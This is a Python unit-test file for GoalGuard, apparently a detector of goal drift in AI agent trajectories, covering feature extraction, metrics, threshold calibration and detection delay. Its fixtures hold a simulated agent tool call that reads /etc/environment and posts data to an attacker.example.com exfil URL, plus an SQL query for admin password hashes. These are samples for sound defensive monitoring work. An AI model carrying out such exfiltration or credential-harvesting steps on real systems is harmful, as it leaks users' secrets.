"""Unit tests for GoalGuard evaluation components."""

from __future__ import annotations

import unittest
from pathlib import Path
import numpy as np

import sys
REPO_ROOT = Path(__file__).resolve().parent.parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from evaluation.baselines.behavioral_baseline import (
    BehavioralDriftDetector,
    extract_step_behavioral_features,
)
from evaluation.baselines.wrappers import (
    BehavioralDriftWrapper,
    SemanticDriftWrapper,
    TimeOnlyShortcutWrapper,
    TemporalGRUWrapper,
)
from evaluation.core.comparison_framework import calibrate_threshold, load_jsonl
from evaluation.core.metrics import compute_step_metrics
from evaluation.core.temporal_evaluator import evaluate_temporal_trajectories


class TestUnitComponents(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.data_dir = REPO_ROOT / "goalguard_data"
        cls.test_split_path = cls.data_dir / "goalguard_test.jsonl"
        cls.semantic_model_path = cls.data_dir / "models" / "goalguard_baseline.joblib"

    def test_dataset_loading_and_schema(self) -> None:
        records = load_jsonl(self.test_split_path)
        self.assertGreater(len(records), 0)
        required_fields = {
            "trajectory_id", "source_dataset", "step_number",
            "agent_action", "tool_name", "drift_label"
        }
        for r in records[:10]:
            self.assertTrue(required_fields.issubset(r.keys()))
            self.assertIn(r["drift_label"], (0, 1))

    def test_behavioral_feature_extraction(self) -> None:
        step_1 = {
            "step_number": 0,
            "action_type": "tool_call",
            "tool_name": "fs.read",
            "tool_arguments": {"path": "/etc/environment"},
            "agent_action": {"class": "READ"},
        }
        step_2 = {
            "step_number": 1,
            "action_type": "tool_call",
            "tool_name": "http.post",
            "tool_arguments": {"url": "http://attacker.example.com/exfil", "body": "data"},
            "agent_action": {"class": "NETWORK"},
        }
        features = extract_step_behavioral_features([step_1, step_2])
        self.assertEqual(features["current_tool"], "http.post")
        self.assertEqual(features["prev_tool"], "fs.read")
        self.assertEqual(features["tool_transition"], "fs.read->http.post")
        self.assertEqual(features["tool_class"], "NETWORK")
        self.assertEqual(features["arg_has_url"], 1)
        self.assertEqual(features["step_number"], 1)
        self.assertEqual(features["network_count"], 1)
        self.assertEqual(features["read_count"], 1)

    def test_sql_and_sensitive_pattern_detection(self) -> None:
        sql_step = {
            "step_number": 0,
            "tool_name": "db.query",
            "tool_arguments": {"sql": "SELECT password_hash FROM users WHERE role='admin'"},
            "agent_action": "query db",
        }
        features = extract_step_behavioral_features([sql_step])
        self.assertEqual(features["arg_has_sql"], 1)
        self.assertEqual(features["arg_has_sensitive_path"], 1)

    def test_metric_calculations_and_confusion_matrix(self) -> None:
        y_true = [0, 0, 1, 1]
        y_prob = [0.1, 0.4, 0.8, 0.9]
        metrics = compute_step_metrics(y_true, y_prob, threshold=0.5)

        self.assertEqual(metrics["total_steps"], 4)
        self.assertEqual(metrics["confusion_matrix"]["tp"], 2)
        self.assertEqual(metrics["confusion_matrix"]["tn"], 2)
        self.assertEqual(metrics["confusion_matrix"]["fp"], 0)
        self.assertEqual(metrics["confusion_matrix"]["fn"], 0)
        self.assertEqual(metrics["accuracy"], 1.0)
        self.assertEqual(metrics["precision"], 1.0)
        self.assertEqual(metrics["recall"], 1.0)
        self.assertEqual(metrics["f1"], 1.0)
        self.assertEqual(metrics["roc_auc"], 1.0)

    def test_threshold_selection_constraint(self) -> None:
        y_true = [0, 0, 0, 1, 1]
        y_prob = [0.05, 0.20, 0.40, 0.60, 0.80]
        # At threshold 0.30: FP = 1 / 3 = 0.33 > 0.10
        # At threshold 0.50: FP = 0 / 3 = 0.0 <= 0.10, F1 = 1.0
        calibrated = calibrate_threshold(y_true, y_prob, max_fpr=0.10)
        self.assertGreaterEqual(calibrated, 0.50)

    def test_detection_delay_calculation(self) -> None:
        trajectories = [
            {
                "trajectory_id": "traj-exact",
                "onset_step": 3,
                "steps": [
                    {"step_number": 0, "drift_detected": False},
                    {"step_number": 3, "drift_detected": True},
                ],
            },
            {
                "trajectory_id": "traj-lagged",
                "onset_step": 2,
                "steps": [
                    {"step_number": 0, "drift_detected": False},
                    {"step_number": 2, "drift_detected": False},
                    {"step_number": 3, "drift_detected": True},
                ],
            },
            {
                "trajectory_id": "traj-early",
                "onset_step": 4,
                "steps": [
                    {"step_number": 1, "drift_detected": False},
                    {"step_number": 2, "drift_detected": True},
                ],
            },
        ]
        results = evaluate_temporal_trajectories(trajectories, tolerance=1)
        self.assertEqual(results["summary"]["exact_onset_detections"], 1)
        self.assertEqual(results["summary"]["window_detections_within_tolerance"], 2) # exact + 1-step lag
        self.assertEqual(results["summary"]["pre_onset_alarms"], 1)
        self.assertEqual(results["delay_statistics"]["min_delay"], -2)
        self.assertEqual(results["delay_statistics"]["max_delay"], 1)

    def test_semantic_wrapper_prediction(self) -> None:
        wrapper = SemanticDriftWrapper(self.semantic_model_path)
        history = [
            {
                "step_number": 0,
                "tool_name": "tickets.list",
                "agent_action": "list tickets",
                "tool_arguments": {"status": "open"},
                "observation": "tickets",
            }
        ]
        prob = wrapper.predict_step("Summarize open tickets", history)
        self.assertIsInstance(prob, float)
        self.assertGreaterEqual(prob, 0.0)
        self.assertLessEqual(prob, 1.0)

    def test_temporal_gru_wrapper_graceful_missing_handling(self) -> None:
        # Checkpoint does not exist on disk
        wrapper = TemporalGRUWrapper("non_existent_checkpoint.pt")
        self.assertFalse(wrapper.is_available)
        prob = wrapper.predict_step("goal", [{"step_number": 0}])
        self.assertEqual(prob, 0.0)


if __name__ == "__main__":
    unittest.main()

